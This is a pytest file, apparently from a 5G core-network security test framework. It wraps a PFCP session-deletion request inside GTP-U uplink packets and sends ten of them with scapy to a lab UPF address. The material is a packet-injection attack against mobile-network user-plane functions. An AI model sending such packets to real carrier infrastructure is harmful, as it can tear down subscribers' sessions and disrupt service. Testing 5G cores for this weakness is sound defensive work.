from __future__ import annotations

from src.utils.ueransim.ue import UserEquipment 
from src.attacks.gtp_u.pfcf_in_gtp import pfcp_in_gtp_packet
from src.utils.common import get_my_ip_from_prefix, ip_list
from src.utils.protocols.pfcp.requests import PFCPRequest

import pytest
from scapy.all import send
import random

@pytest.fixture(autouse=True)
def clear_ues():
    
    # Setup
    UserEquipment.terminate_all()
    
    # Execution
    yield 
    
    # Teardown 
    UserEquipment.terminate_all()
    
def test_pfcp_in_gtp():
    
    # Create new UE
    # test_imsi = UserEquipment.get_available_imsi() # Get a random IMSI that is not currently registered
    # test_ue:UserEquipment|None = UserEquipment.register_new(test_imsi)
    # session = test_ue.sessions[0]
    
    # Create the encapsulated packet
    pfcp_packet = PFCPRequest.session_deletion(
        src_addr = "10.1.1.2", 
        dst_addr = "192.168.70.134",
        seid=random.randint(1, PFCPRequest.max_seid)
    )
    
    for i in range(10):
    
        # Send gtp uplink packet
        packet = pfcp_in_gtp_packet(
            src_addr = "10.0.1.2", 
            dst_addr = "192.168.70.134",
            teid = i,
            pfcp_packet = pfcp_packet
        )
        print(packet.show())

        send(packet)
    assert False
    
    # by sniffing the network we should see a association response from the UPF  